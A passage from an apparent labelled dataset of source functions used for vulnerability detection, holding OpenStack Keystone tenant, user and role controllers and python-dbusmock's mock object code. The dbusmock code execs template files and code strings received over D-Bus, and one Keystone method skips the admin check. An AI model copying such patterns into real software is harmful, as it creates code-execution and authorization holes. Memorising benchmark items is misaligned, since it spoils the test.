{'tenant': tenant}\n\n    def update_tenant(self, context, tenant_id, tenant):\n        self.assert_admin(context)\n        if self.identity_api.get_tenant(context, tenant_id) is None:\n            raise exception.TenantNotFound(tenant_id=tenant_id)\n\n        tenant_ref = self.identity_api.update_tenant(\n                context, tenant_id, tenant)\n        return {'tenant': tenant_ref}\n\n    def delete_tenant(self, context, tenant_id, **kw):\n        self.assert_admin(context)\n        if self.identity_api.get_tenant(context, tenant_id) is None:\n            raise exception.TenantNotFound(tenant_id=tenant_id)\n\n        self.identity_api.delete_tenant(context, tenant_id)\n\n    def get_tenant_users(self, context, tenant_id, **kw):\n        self.assert_admin(context)\n        if self.identity_api.get_tenant(context, tenant_id) is None:\n            raise exception.TenantNotFound(tenant_id=tenant_id)\n\n        user_refs = self.identity_api.get_tenant_users(context, tenant_id)\n        return {'users': user_refs}\n\n    def _format_tenant_list(self, tenant_refs, **kwargs):\n        marker = kwargs.get('marker')\n        page_idx = 0\n        if marker is not None:\n            for (marker_idx, tenant) in enumerate(tenant_refs):\n                if tenant['id'] == marker:\n                    # we start pagination after the marker\n                    page_idx = marker_idx + 1\n                    break\n            else:\n                msg = 'Marker could not be found'\n                raise exception.ValidationError(message=msg)\n\n        limit = kwargs.get('limit')\n        if limit is not None:\n            try:\n                limit = int(limit)\n                if limit < 0:\n                    raise AssertionError()\n            except (ValueError, AssertionError):\n                msg = 'Invalid limit value'\n                raise exception.ValidationError(message=msg)\n\n        tenant_refs = tenant_refs[page_idx:limit]\n\n        for x in tenant_refs:\n            if 'enabled' not in x:\n                x['enabled'] = True\n        o = {'tenants': tenant_refs,\n             'tenants_links': []}\n        return o\n\n\nclass UserController(wsgi.Application):\n    def __init__(self):\n        self.identity_api = Manager()\n        self.policy_api = policy.Manager()\n        self.token_api = token.Manager()\n        super(UserController, self).__init__()\n\n    def get_user(self, context, user_id):\n        self.assert_admin(context)\n        user_ref = self.identity_api.get_user(context, user_id)\n        if not user_ref:\n            raise exception.UserNotFound(user_id=user_id)\n\n        return {'user': user_ref}\n\n    def get_users(self, context):\n        # NOTE(termie): i can't imagine that this really wants all the data\n        #               about every single user in the system...\n        self.assert_admin(context)\n        user_refs = self.identity_api.list_users(context)\n        return {'users': user_refs}\n\n    # CRUD extension\n    def create_user(self, context, user):\n        user = self._normalize_dict(user)\n        self.assert_admin(context)\n        tenant_id = user.get('tenantId', None)\n        if (tenant_id is not None\n                and self.identity_api.get_tenant(context, tenant_id) is None):\n            raise exception.TenantNotFound(tenant_id=tenant_id)\n        user_id = uuid.uuid4().hex\n        user_ref = user.copy()\n        user_ref['id'] = user_id\n        new_user_ref = self.identity_api.create_user(\n                context, user_id, user_ref)\n        if tenant_id:\n            self.identity_api.add_user_to_tenant(context, tenant_id, user_id)\n        return {'user': new_user_ref}\n\n    def update_user(self, context, user_id, user):\n        # NOTE(termie): this is really more of a patch than a put\n        self.assert_admin(context)\n        if self.identity_api.get_user(context, user_id) is None:\n            raise exception.UserNotFound(user_id=user_id)\n\n        user_ref = self.identity_api.update_user(context, user_id, user)\n\n        # If the password was changed or the user was disabled we clear tokens\n        if user.get('password') or user.get('enabled', True) == False:\n            try:\n                for token_id in self.token_api.list_tokens(context, user_id):\n                    self.token_api.delete_token(context, token_id)\n            except exception.NotImplemented:\n                # The users status has been changed but tokens remain valid for\n                # backends that can't list tokens for users\n                LOG.warning('User %s status has changed, but existing tokens '\n                            'remain valid' % user_id)\n        return {'user': user_ref}\n\n    def delete_user(self, context, user_id):\n        self.assert_admin(context)\n        if self.identity_api.get_user(context, user_id) is None:\n            raise exception.UserNotFound(user_id=user_id)\n\n        self.identity_api.delete_user(context, user_id)\n\n    def set_user_enabled(self, context, user_id, user):\n        return self.update_user(context, user_id, user)\n\n    def set_user_password(self, context, user_id, user):\n        return self.update_user(context, user_id, user)\n\n    def update_user_tenant(self, context, user_id, user):\n        \"\"\"Update the default tenant.\"\"\"\n        # ensure that we're a member of that tenant\n        tenant_id = user.get('tenantId')\n        self.identity_api.add_user_to_tenant(context, tenant_id, user_id)\n        return self.update_user(context, user_id, user)\n\n\nclass RoleController(wsgi.Application):\n    def __init__(self):\n        self.identity_api = Manager()\n        self.token_api = token.Manager()\n        self.policy_api = policy.Manager()\n        super(RoleController, self).__init__()\n\n    # COMPAT(essex-3)\n    def get_user_roles(self, context, user_id, tenant_id=None):\n        \"\"\"Get the roles for a user and tenant pair.\n\n        Since we're trying to ignore the idea of user-only roles we're\n        not implementing them in hopes that the idea will die off.\n\n        \"\"\"\n        if tenant_id is None:\n            raise exception.NotImplemented(message='User roles not supported: '\n                                                   'tenant ID required')\n\n        user = self.identity_api.get_user(context, user_id)\n        if user is None:\n            raise exception.UserNotFound(user_id=user_id)\n        tenant = self.identity_api.get_tenant(context, tenant_id)\n        if tenant is None:\n            raise exception.TenantNotFound(tenant_id=tenant_id)\n\n        roles = self.identity_api.get_roles_for_user_and_tenant(\n                context, user_id, tenant_id)\n        return {'roles': [self.identity_api.get_role(context, x)\n                          for x in roles]}\n\n    # CRUD extension\n    def get_role(self, context, role_id):\n        self.assert_admin(context)\n        role_ref = self.identity_api.get_role(context, role_id)\n        if not role_ref:\n            raise exception.RoleNotFound(role_id=role_id)\n        return {'role': role_ref}\n\n    def create_role(self, context, role):\n        role = self._normalize_dict(role)\n        self.assert_admin(context)\n        role_id = uuid.uuid4().hex\n        role['id'] = role_id\n        role_ref = self.identity_api.create_role(context, role_id, role)\n        return {'role': role_ref}\n\n    def delete_role(self, context, role_id):\n        self.assert_admin(context)\n        self.get_role(context, role_id)\n        self.identity_api.delete_role(context, role_id)\n\n    def get_roles(self, context):\n        self.assert_admin(context)\n        roles = self.identity_api.list_roles(context)\n        # TODO(termie): probably inefficient at some point\n        return {'roles': roles}\n\n    def add_role_to_user(self, context, user_id, role_id, tenant_id=None):\n        \"\"\"Add a role to a user and tenant pair.\n\n        Since we're trying to ignore the idea of user-only roles we're\n        not implementing them in hopes that the idea will die off.\n\n        \"\"\"\n        self.assert_admin(context)\n        if tenant_id is None:\n            raise exception.NotImplemented(message='User roles not supported: '\n                                                   'tenant_id required')\n        if self.identity_api.get_user(context, user_id) is None:\n            raise exception.UserNotFound(user_id=user_id)\n        if self.identity_api.get_tenant(context, tenant_id) is None:\n            raise exception.TenantNotFound(tenant_id=tenant_id)\n        if self.identity_api.get_role(context, role_id) is None:\n            raise exception.RoleNotFound(role_id=role_id)\n\n        # This still has the weird legacy semantics that adding a role to\n        # a user also adds them to a tenant\n        self.identity_api.add_user_to_tenant(context, tenant_id, user_id)\n        self.identity_api.add_role_to_user_and_tenant(\n                context, user_id, tenant_id, role_id)\n        role_ref = self.identity_api.get_role(context, role_id)\n        return {'role': role_ref}\n\n    def remove_role_from_user(self, context, user_id, role_id, tenant_id=None):\n        \"\"\"Remove a role from a user and tenant pair.\n\n        Since we're trying to ignore the idea of user-only roles we're\n        not implementing them in hopes that the idea will die off.\n\n        \"\"\"\n        self.assert_admin(context)\n        if tenant_id is None:\n            raise exception.NotImplemented(message='User roles not supported: '\n                                                   'tenant_id required')\n        if self.identity_api.get_user(context, user_id) is None:\n            raise exception.UserNotFound(user_id=user_id)\n        if self.identity_api.get_tenant(context, tenant_id) is None:\n            raise exception.TenantNotFound(tenant_id=tenant_id)\n        if self.identity_api.get_role(context, role_id) is None:\n            raise exception.RoleNotFound(role_id=role_id)\n\n        # This still has the weird legacy semantics that adding a role to\n        # a user also adds them to a tenant, so we must follow up on that\n        self.identity_api.remove_role_from_user_and_tenant(\n                context, user_id, tenant_id, role_id)\n        roles = self.identity_api.get_roles_for_user_and_tenant(\n                context, user_id, tenant_id)\n        if not roles:\n            self.identity_api.remove_user_from_tenant(\n                    context, tenant_id, user_id)\n        return\n\n    # COMPAT(diablo): CRUD extension\n    def get_role_refs(self, context, user_id):\n        \"\"\"Ultimate hack to get around having to make role_refs first-class.\n\n        This will basically iterate over the various roles the user has in\n        all tenants the user is a member of and create fake role_refs where\n        the id encodes the user-tenant-role information so we can look\n        up the appropriate data when we need to delete them.\n\n        \"\"\"\n        self.assert_admin(context)\n        user_ref = self.identity_api.get_user(context, user_id)\n        tenant_ids = self.identity_api.get_tenants_for_user(context, user_id)\n        o = []\n        for tenant_id in tenant_ids:\n            role_ids = self.identity_api.get_roles_for_user_and_tenant(\n                    context, user_id, tenant_id)\n            for role_id in role_ids:\n                ref = {'roleId': role_id,\n                       'tenantId': tenant_id,\n                       'userId': user_id}\n                ref['id'] = urllib.urlencode(ref)\n                o.append(ref)\n        return {'roles': o}\n\n    # COMPAT(diablo): CRUD extension\n    def create_role_ref(self, context, user_id, role):\n        \"\"\"This is actually used for adding a user to a tenant.\n\n        In the legacy data model adding a user to a tenant required setting\n        a role.\n\n        \"\"\"\n        self.assert_admin(context)\n        # TODO(termie): for now we're ignoring the actual role\n        tenant_id = role.get('tenantId')\n        role_id = role.get('roleId')\n        self.identity_api.add_user_to_tenant(context, tenant_id, user_id)\n        self.identity_api.add_role_to_user_and_tenant(\n                context, user_id, tenant_id, role_id)\n        role_ref = self.identity_api.get_role(context, role_id)\n        return {'role': role_ref}\n\n    # COMPAT(diablo): CRUD extension\n    def delete_role_ref(self, context, user_id, role_ref_id):\n        \"\"\"This is actually used for deleting a user from a tenant.\n\n        In the legacy data model removing a user from a tenant required\n        deleting a role.\n\n        To emulate this, we encode the tenant and role in the role_ref_id,\n        and if this happens to be the last role for the user-tenant pair,\n        we remove the user from the tenant.\n\n        \"\"\"\n        self.assert_admin(context)\n        # TODO(termie): for now we're ignoring the actual role\n        role_ref_ref = urlparse.parse_qs(role_ref_id)\n        tenant_id = role_ref_ref.get('tenantId')[0]\n        role_id = role_ref_ref.get('roleId')[0]\n        self.identity_api.remove_role_from_user_and_tenant(\n                context, user_id, tenant_id, role_id)\n        roles = self.identity_api.get_roles_for_user_and_tenant(\n                context, user_id, tenant_id)\n        if not roles:\n            self.identity_api.remove_user_from_tenant(\n                    context, tenant_id, user_id)\n", "target": 0}
{"idx": 995, "func": "# coding: UTF-8\n'''Mock D-BUS objects for test suites.'''\n\n# This program is free software; you can redistribute it and/or modify it under\n# the terms of the GNU Lesser General Public License as published by the Free\n# Software Foundation; either version 3 of the License, or (at your option) any\n# later version.  See http://www.gnu.org/copyleft/lgpl.html for the full text\n# of the license.\n\n__author__ = 'Martin Pitt'\n__email__ = 'martin.pitt@ubuntu.com'\n__copyright__ = '(c) 2012 Canonical Ltd.'\n__license__ = 'LGPL 3+'\n\nimport copy\nimport time\nimport sys\nimport types\nimport importlib\nimport imp\nfrom xml.etree import ElementTree\n\n# we do not use this ourselves, but mock methods often want to use this\nimport os\nos  # pyflakes\n\nimport dbus\nimport dbus.service\n\n# global path -> DBusMockObject mapping\nobjects = {}\n\nMOCK_IFACE = 'org.freedesktop.DBus.Mock'\nOBJECT_MANAGER_IFACE = 'org.freedesktop.DBus.ObjectManager'\n\n# stubs to keep code compatible with Python 2 and 3\nif sys.version_info[0] >= 3:\n    long = int\n    unicode = str\n\n\ndef load_module(name):\n    if os.path.exists(name) and os.path.splitext(name)[1] == '.py':\n        mod = imp.new_module(os.path.splitext(os.path.basename(name))[0])\n        with open(name) as f:\n            exec(f.read(), mod.__dict__, mod.__dict__)\n        return mod\n\n    return importlib.import_module('dbusmock.templates.' + name)\n\n\nclass DBusMockObject(dbus.service.Object):\n    '''Mock D-Bus object\n\n    This can be configured to have arbitrary methods (including code execution)\n    and properties via methods on the org.freedesktop.DBus.Mock interface, so\n    that you can control the mock from any programming language.\n    '''\n\n    def __init__(self, bus_name, path, interface, props, logfile=None,\n                 is_object_manager=False):\n        '''Create a new DBusMockObject\n\n        bus_name: A dbus.service.BusName instance where the object will be put on\n        path: D-Bus object path\n        interface: Primary D-Bus interface name of this object (where\n                   properties and methods will be put on)\n        props: A property_name (string) \u2192 property (Variant) map with initial\n               properties on \"interface\"\n        logfile: When given, method calls will be logged into that file name;\n                 if None, logging will be written to stdout. Note that you can\n                 also query the called methods over D-BUS with GetCalls() and\n                 GetMethodCalls().\n        is_object_manager: If True, the GetManagedObjects method will\n                           automatically be implemented on the object, returning\n                           all objects which have this one\u2019s path as a prefix of\n                           theirs. Note that the InterfacesAdded and\n                           InterfacesRemoved signals will not be automatically\n                           emitted.\n        '''\n        dbus.service.Object.__init__(self, bus_name, path)\n\n        self.bus_name = bus_name\n        self.path = path\n        self.interface = interface\n        self.is_object_manager = is_object_manager\n\n        self._template = None\n        self._template_parameters = None\n\n        if logfile:\n            self.logfile = open(logfile, 'w')\n        else:\n            self.logfile = None\n        self.is_logfile_owner = True\n        self.call_log = []\n\n        if props is None:\n            props = {}\n\n        self._reset(props)\n\n    def __del__(self):\n        if self.logfile and self.is_logfile_owner:\n            self.logfile.close()\n\n    def _set_up_object_manager(self):\n        '''Set up this mock object as a D-Bus ObjectManager.'''\n        if self.path == '/':\n            cond = 'k != \\'/\\''\n        else:\n            cond = 'k.startswith(\\'%s/\\')' % self.path\n\n        self.AddMethod(OBJECT_MANAGER_IFACE,\n                       'GetManagedObjects', '', 'a{oa{sa{sv}}}',\n                       'ret = {dbus.ObjectPath(k): objects[k].props ' +\n                       '  for k in objects.keys() if ' + cond + '}')\n\n    def _reset(self, props):\n        # interface -> name -> value\n        self.props = {self.interface: props}\n\n        # interface -> name -> (in_signature, out_signature, code, dbus_wrapper_fn)\n        self.methods = {self.interface: {}}\n\n        if self.is_object_manager:\n            self._set_up_object_manager()\n\n    @dbus.service.method(dbus.PROPERTIES_IFACE,\n                         in_signature='ss', out_signature='v')\n    def Get(self, interface_name, property_name):\n        '''Standard D-Bus API for getting a property value'''\n\n        self.log('Get %s.%s' % (interface_name, property_name))\n\n        if not interface_name:\n            interface_name = self.interface\n        try:\n            return self.GetAll(interface_name)[property_name]\n        except KeyError:\n            raise dbus.exceptions.DBusException(\n                'no such property ' + property_name,\n                name=self.interface + '.UnknownProperty')\n\n    @dbus.service.method(dbus.PROPERTIES_IFACE,\n                         in_signature='s', out_signature='a{sv}')\n    def GetAll(self, interface_name, *args, **kwargs):\n        '''Standard D-Bus API for getting all property values'''\n\n        self.log('GetAll ' + interface_name)\n\n        if not interface_name:\n            interface_name = self.interface\n        try:\n            return self.props[interface_name]\n        except KeyError:\n            raise dbus.exceptions.DBusException(\n                'no such interface ' + interface_name,\n                name=self.interface + '.UnknownInterface')\n\n    @dbus.service.method(dbus.PROPERTIES_IFACE,\n                         in_signature='ssv', out_signature='')\n    def Set(self, interface_name, property_name, value, *args, **kwargs):\n        '''Standard D-Bus API for setting a property value'''\n\n        self.log('Set %s.%s%s' % (interface_name,\n                                  property_name,\n                                  self.format_args((value,))))\n\n        try:\n            iface_props = self.props[interface_name]\n        except KeyError:\n            raise dbus.exceptions.DBusException(\n                'no such interface ' + interface_name,\n                name=self.interface + '.UnknownInterface')\n\n        if property_name not in iface_props:\n            raise dbus.exceptions.DBusException(\n                'no such property ' + property_name,\n                name=self.interface + '.UnknownProperty')\n\n        iface_props[property_name] = value\n\n        self.EmitSignal('org.freedesktop.DBus.Properties',\n                        'PropertiesChanged',\n                        'sa{sv}as',\n                        [interface_name,\n                         dbus.Dictionary({property_name: value}, signature='sv'),\n                         dbus.Array([], signature='s')\n                        ])\n\n    @dbus.service.method(MOCK_IFACE,\n                         in_signature='ssa{sv}a(ssss)',\n                         out_signature='')\n    def AddObject(self, path, interface, properties, methods):\n        '''Add a new D-Bus object to the mock\n\n        path: D-Bus object path\n        interface: Primary D-Bus interface name of this object (where\n                   properties and methods will be put on)\n        properties: A property_name (string) \u2192 value map with initial\n                    properties on \"interface\"\n        methods: An array of 4-tuples (name, in_sig, out_sig, code) describing\n                 methods to add to \"interface\"; see AddMethod() for details of\n                 the tuple values\n\n        If this is a D-Bus ObjectManager instance, the InterfacesAdded signal\n        will *not* be emitted for the object automatically; it must be emitted\n        manually if desired. This is because AddInterface may be called after\n        AddObject, but before the InterfacesAdded signal should be emitted.\n\n        Example:\n        dbus_proxy.AddObject('/com/example/Foo/Manager',\n                             'com.example.Foo.Control',\n                             {\n                                 'state': dbus.String('online', variant_level=1),\n                             },\n                             [\n                                 ('Start', '', '', ''),\n                                 ('EchoInt', 'i', 'i', 'ret = args[0]'),\n                                 ('GetClients', '', 'ao', 'ret = [\"/com/example/Foo/Client1\"]'),\n                             ])\n        '''\n        if path in objects:\n            raise dbus.exceptions.DBusException(\n                'object %s already exists' % path,\n                name='org.freedesktop.DBus.Mock.NameError')\n\n        obj = DBusMockObject(self.bus_name,\n                             path,\n                             interface,\n                             properties)\n        # make sure created objects inherit the log file stream\n        obj.logfile = self.logfile\n        obj.is_logfile_owner = False\n        obj.AddMethods(interface, methods)\n\n        objects[path] = obj\n\n    @dbus.service.method(MOCK_IFACE,\n                         in_signature='s',\n                         out_signature='')\n    def RemoveObject(self, path):\n        '''Remove a D-Bus object from the mock\n\n        As with AddObject, this will *not* emit the InterfacesRemoved signal if\n        it\u2019s an ObjectManager instance.\n        '''\n        try:\n            objects[path].remove_from_connection()\n            del objects[path]\n        except KeyError:\n            raise dbus.exceptions.DBusException(\n                'object %s does not exist' % path,\n                name='org.freedesktop.DBus.Mock.NameError')\n\n    @dbus.service.method(MOCK_IFACE,\n                         in_signature='', out_signature='')\n    def Reset(self):\n        '''Reset the mock object state.\n\n        Remove all mock objects from the bus and tidy up so the state is as if\n        python-dbusmock had just been restarted. If the mock object was\n        originally created with a template (from the command line, the Python\n        API or by calling AddTemplate over D-Bus), it will be\n        re-instantiated with that template.\n        '''\n        # Clear other existing objects.\n        for obj_name, obj in objects.items():\n            if obj_name != self.path:\n                obj.remove_from_connection()\n        objects.clear()\n\n        # Reinitialise our state. Carefully remove new methods from our dict;\n        # they don't not actually exist if they are a statically defined\n        # template function\n        for method_name in self.methods[self.interface]:\n            try:\n                delattr(self.__class__, method_name)\n            except AttributeError:\n                pass\n\n        self._reset({})\n\n        if self._template is not None:\n            self.AddTemplate(self._template, self._template_parameters)\n\n        objects[self.path] = self\n\n    @dbus.service.method(MOCK_IFACE,\n                         in_signature='sssss',\n                         out_signature='')\n    def AddMethod(self, interface, name, in_sig, out_sig, code):\n        '''Add a method to this object\n\n        interface: D-Bus interface to add this to. For convenience you can\n                   specify '' here to add the method to the object's main\n                   interface (as specified on construction).\n        name: Name of the method\n        in_sig: Signature of input arguments; for example \"ias\" for a method\n                that takes an int32 and a string array as arguments; see\n                http://dbus.freedesktop.org/doc/dbus-specification.html#message-protocol-signatures\n        out_sig: Signature of output arguments; for example \"s\" for a method\n                 that returns a string; use '' for methods that do not return\n                 anything.\n        code: Python 3 code to run in the method call; you have access to the\n              arguments through the \"args\" list, and can set the return value\n              by assigning a value to the \"ret\" variable. You can also read the\n              global \"objects\" variable, which is a dictionary mapping object\n              paths to DBusMockObject instances.\n\n              For keeping state across method calls, you are free to use normal\n              Python members of the \"self\" object, which will be persistant for\n              the whole mock's life time. E. g. you can have a method with\n              \"self.my_state = True\", and another method that returns it with\n              \"ret = self.my_state\".\n\n              When specifying '', the method will not do anything (except\n              logging) and return None.\n        '''\n        if not interface:\n            interface = self.interface\n        n_args = len(dbus.Signature(in_sig))\n\n        # we need to have separate methods for dbus-python, so clone\n        # mock_method(); using message_keyword with this dynamic approach fails\n        # because inspect cannot handle those, so pass on interface and method\n        # name as first positional arguments\n        method = lambda self, *args, **kwargs: DBusMockObject.mock_method(\n            self, interface, name, in_sig, *args, **kwargs)\n\n        # we cannot specify in_signature here, as that trips over a consistency\n        # check in dbus-python; we need to set it manually instead\n        dbus_method = dbus.service.method(interface,\n                                          out_signature=out_sig)(method)\n        dbus_method.__name__ = str(name)\n        dbus_method._dbus_in_signature = in_sig\n        dbus_method._dbus_args = ['arg%i' % i for i in range(1, n_args + 1)]\n\n        # for convenience, add mocked methods on the primary interface as\n        # callable methods\n        if interface == self.interface:\n            setattr(self.__class__, name, dbus_method)\n\n        self.methods.setdefault(interface, {})[str(name)] = (in_sig, out_sig, code, dbus_method)\n\n    @dbus.service.method(MOCK_IFACE,\n                         in_signature='sa(ssss)',\n                         out_signature='')\n    def AddMethods(self, interface, methods):\n        '''Add several methods to this object\n\n        interface: D-Bus interface to add this to. For convenience you can\n                   specify '' here to add the method to the object's main\n                   interface (as specified on construction).\n        methods: list of 4-tuples (name, in_sig, out_sig, code) describing one\n                 method each. See AddMethod() for details of the tuple values.\n        '''\n        for method in methods:\n            self.AddMethod(interface, *method)\n\n    @dbus.service.method(MOCK_IFACE,\n                         in_signature='ssv',\n                         out_signature='')\n    def AddProperty(self, interface, name, value):\n        '''Add property to this object\n\n        interface: D-Bus interface to add this to. For convenience you can\n                   specify '' here to add the property to the object's main\n                   interface (as specified on construction).\n        name: Property name.\n        value: Property value.\n        '''\n        if not interface:\n            interface = self.interface\n        try:\n            self.props[interface][name]\n            raise dbus.exceptions.DBusException(\n                'property %s already exists' % name,\n                name=self.interface + '.PropertyExists')\n        except KeyError:\n            # this is what we expect\n            pass\n\n        # copy.copy removes one level of variant-ness, which means that the\n        # types get exported in introspection data correctly, but we can't do\n        # this for container types.\n        if not (isinstance(value, dbus.Dictionary) or isinstance(value, dbus.Array)):\n            value = copy.copy(value)\n\n        self.props.setdefault(interface, {})[name] = value\n\n    @dbus.service.method(MOCK_IFACE,\n                         in_signature='sa{sv}',\n                         out_signature='')\n    def AddProperties(self, interface, properties):\n        '''Add several properties to this object\n\n        interface: D-Bus interface to add this to. For convenience you can\n                   specify '' here to add the property to the object's main\n                   interface (as specified on construction).\n        properties: A property_name (string) \u2192 value map\n        '''\n        for k, v in properties.items():\n            self.AddProperty(interface, k, v)\n\n    @dbus.service.method(MOCK_IFACE,\n                         in_signature='sa{sv}',\n                         out_signature='')\n    def AddTemplate(self, template, parameters):\n        '''Load a template into the mock.\n\n        python-dbusmock ships a set of standard mocks for common system\n        services such as UPower and NetworkManager. With these the actual tests\n        become a lot simpler, as they only have to set up the particular\n        properties for the tests, and not the skeleton of common properties,\n        interfaces, and methods.\n\n        template: Name of the template to load or the full path to a *.py file\n                  for custom templates. See \"pydoc dbusmock.templates\" for a\n                  list of available templates from python-dbusmock package, and\n                  \"pydoc dbusmock.templates.NAME\" for documentation about\n                  template NAME.\n        parameters: A parameter (string) \u2192 value (variant) map, for\n                    parameterizing templates. Each template can define their\n                    own, see documentation of that particular template for\n                    details.\n        '''\n        try:\n            module = load_module(template)\n        except ImportError as e:\n            raise dbus.exceptions.DBusException('Cannot add template %s: %s' % (template, str(e)),\n                                                name='org.freedesktop.DBus.Mock.TemplateError')\n\n        # If the template specifies this is an ObjectManager, set that up\n        if hasattr(module, 'IS_OBJECT_MANAGER') and module.IS_OBJECT_MANAGER:\n            self._set_up_object_manager()\n\n        # pick out all D-BUS service methods and add them to our interface\n        for symbol in dir(module):\n            fn = getattr(module, symbol)\n            if ('_dbus_interface' in dir(fn) and\n                    ('_dbus_is_signal' not in dir(fn) or not fn._dbus_is_signal)):\n                # for dbus-python compatibility, add methods as callables\n                setattr(self.__class__, symbol, fn)\n                self.methods.setdefault(fn._dbus_interface, {})[str(symbol)] = (\n                    fn._dbus_in_signature,\n                    fn._dbus_out_signature, '', fn\n                )\n\n        if parameters is None:\n            parameters = {}\n\n        module.load(self, parameters)\n        # save the given template and parameters for re-instantiation on\n        # Reset()\n        self._template = template\n        self._template_parameters = parameters\n\n    @dbus.service.method(MOCK_IFACE,\n                         in_signature='sssav',\n                         out_signature='')\n    def EmitSignal(self, interface, name, signature, args):\n        '''Emit a signal from the object.\n\n        interface: D-Bus interface to send the signal from. For convenience you\n                   can specify '' here to add the method to the object's main\n                   interface (as specified on construction).\n        name: Name of the signal\n        signature: Signature of input arguments; for example \"ias\" for a signal\n                that takes an int32 and a string array as arguments; see\n                http://dbus.freedesktop.org/doc/dbus-specification.html#message-protocol-signatures\n        args: variant array with signal arguments; must match order and type in\n              \"signature\"\n        '''\n        if not interface:\n            interface = self.interface\n\n        # convert types of arguments according to signature, using\n        # MethodCallMessage.append(); this will also provide type/length\n        # checks, except for the case of an empty signature\n        if signature == '' and len(args) > 0:\n            raise TypeError('Fewer items found in D-Bus signature than in Python arguments')\n        m = dbus.connection.MethodCallMessage('a.b', '/a', 'a.b', 'a')\n        m.append(signature=signature, *args)\n        args = m.get_args_list()\n\n        fn = lambda self, *args: self.log('emit %s.%s%s' % (interface, name, self.format_args(args)))\n        fn.__name__ = str(name)\n        dbus_fn = dbus.service.signal(interface)(fn)\n        dbus_fn._dbus_signature = signature\n        dbus_fn._dbus_args = ['arg%i' % i for i in range(1, len(args) + 1)]\n\n        dbus_fn(self, *args)\n\n    @dbus.service.method(MOCK_IFACE,\n                         in_signature='',\n                         out_signature='a(tsav)')\n    def GetCalls(self):\n        '''List all the logged calls since the last call to ClearCalls().\n\n        Return a list of (timestamp, method_name, args_list) tuples.\n        '''\n        return self.call_log\n\n    @dbus.service.method(MOCK_IFACE,\n                         in_signature='s',\n                         out_signature='a(tav)')\n    def GetMethodCalls(self, method):\n        '''List all the logged calls of a particular method.\n\n        Return a list of (timestamp, args_list) tuples.\n        '''\n        return [(row[0], row[2]) for row in self.call_log if row[1] == method]\n\n    @dbus.service.method(MOCK_IFACE,\n                         in_signature='',\n                         out_signature='')\n    def ClearCalls(self):\n        '''Empty the log of mock call signatures.'''\n\n        self.call_log = []\n\n    @dbus.service.signal(MOCK_IFACE, signature='sav')\n    def MethodCalled(self, name, args):\n        '''Signal emitted for every called mock method.\n\n        This is emitted for all mock method calls.  This can be used to confirm\n        that a particular method was called with particular arguments, as an\n        alternative to reading the mock's log or GetCalls().\n        '''\n        pass\n\n    def mock_method(self, interface, dbus_method, in_signature, *args, **kwargs):\n        '''Master mock method.\n\n        This gets \"instantiated\" in AddMethod(). Execute the code snippet of\n        the method and return the \"ret\" variable if it was set.\n        '''\n        # print('mock_method', dbus_method, self, in_signature, args, kwargs, file=sys.stderr)\n\n        # convert types of arguments according to signature, using\n        # MethodCallMessage.append(); this will also provide type/length\n        # checks, except for the case of an empty signature\n        if in_signature == '' and len(args) > 0:\n            raise TypeError('Fewer items found in D-Bus signature than in Python arguments')\n        m = dbus.connection.MethodCallMessage('a.b', '/a', 'a.b', 'a')\n        m.append(signature=in_signature, *args)\n        args = m.get_args_list()\n\n        self.log(dbus_method + self.format_args(args))\n        self.call_log.append((int(time.time()), str(dbus_method), args))\n        self.MethodCalled(dbus_method, args)\n\n        # The code may be a Python 3 string to interpret, or may be a function\n        # object (if AddMethod was called from within Python itself, rather than\n        # over D-Bus).\n        code = self.methods[interface][dbus_method][2]\n        if code and isinstance(code, types.FunctionType):\n            return code(self, *args)\n        elif code:\n            loc = locals().copy()\n            exec(code, globals(), loc)\n            if 'ret' in loc:\n                return loc['ret']\n\n    def format_args(self, args):\n        '''Format a D-BUS argument tuple into an appropriate logging string.'''\n\n        def format_arg(a):\n            if isinstance(a, dbus.Boolean):\n                return str(bool(a))\n            if isinstance(a, dbus.Byte):\n                return str(int(a))\n            if isinstance(a, int) or isinstance(a, long):\n                return str(a)\n            if isinstance(a, str) or isinstance(a, unicode):\n                return '\"' + str(a) + '\"'\n            if isinstance(a, list):\n                return '[' + ', '.join([format_arg(x) for x in a]) + ']'\n            if isinstance(a, dict):\n                fmta = '{'\n                first = True\n                for k, v in a.items():\n                    if first:\n                        first = False\n                    else:\n                        fmta += ', '\n                    fmta += format_arg(k) + ': ' + format_arg(v)\n                return fmta + '}'\n\n            # fallback\n            return repr(a)\n\n        s = ''\n        for a in args:\n            if s:\n                s += ' '\n            s += format_arg(a)\n        if s:\n            s = ' ' + s\n        return s\n\n    def log(self, msg):\n        '''Log a message, prefixed with a timestamp.\n\n        If a log file was specified in the constructor, it is written there,\n        otherwise it goes to stdout.\n        '''\n        if self.logfile:\n            fd = self.logfile\n        else:\n            fd = sys.stdout\n\n        fd.write('%.3f %s\\n' % (time.time(), msg))\n        fd.flush()\n\n    @dbus.service.method(dbus.INTROSPECTABLE_IFACE,\n                         in_signature='',\n                         out_signature='s',\n                         path_keyword='object_path',\n                         connection_keyword='connection')\n    def Introspect(self, object_path, connection):\n        '''Return XML description of this object's interfaces, methods and signals.\n\n        This wraps dbus-python's Introspect() method to include the dynamic\n        methods and properties.\n        '''\n        # temporarily add our dynamic methods\n        cls = self.__class__.__module__ + '.' + self.__class__.__name__\n        orig_interfaces = self._dbus_class_table[cls]\n\n        mock_interfaces = orig_interfaces.copy()\n        for interface, methods in self.methods.items():\n            for method in methods:\n                mock_interfaces.setdefault(interface, {})[method] = self.methods[interface][method][3]\n        self._dbus_class_table[cls] = mock_interfaces\n\n        xml = dbus.service.Object.Introspect(self, object_path, connection)\n\n        tree = ElementTree.fromstring(xml)\n\n        for name in self.props:\n            # We might have properties for new interfaces we don't know about\n            # yet. Try to find an existing <interface> node named after our\n            # interface to append to, and create one if we can't.\n            interface = tree.find(\".//interface[@name='%s']\" % name)\n            if interface is None:\n                interface = ElementTree.Element(\"interface\", {\"name\": name})\n                tree.append(interface)\n\n            for prop, val in self.props[name].items():\n                if val is None:\n                    # can't guess type from None, skip\n                    continue\n                elem = ElementTree.Element(\"property\", {\n                    \"name\": prop,\n                    # We don't store the signature anywhere, so guess it.\n                    \"type\": dbus.lowlevel.Message.guess_signature(val),\n                    \"access\": \"readwrite\"})\n\n                interface.append(elem)\n\n        xml = ElementTree.tostring(tree, encoding='utf8', method='xml').decode('utf8')\n\n        # restore original class table\n        self._dbus_class_table[cls] = orig_interfaces\n\n        return xml\n\n\n# Overwrite dbus-python's _method_lookup(), as that offers no way to have the\n# same method name on different interfaces\norig_method_lookup = dbus.service._method_lookup\n\n\ndef _dbusmock_method_lookup(obj, method_name, dbus_interface):\n    try:\n        m = obj.methods[dbus_interface or obj.interface][method_name]\n        return 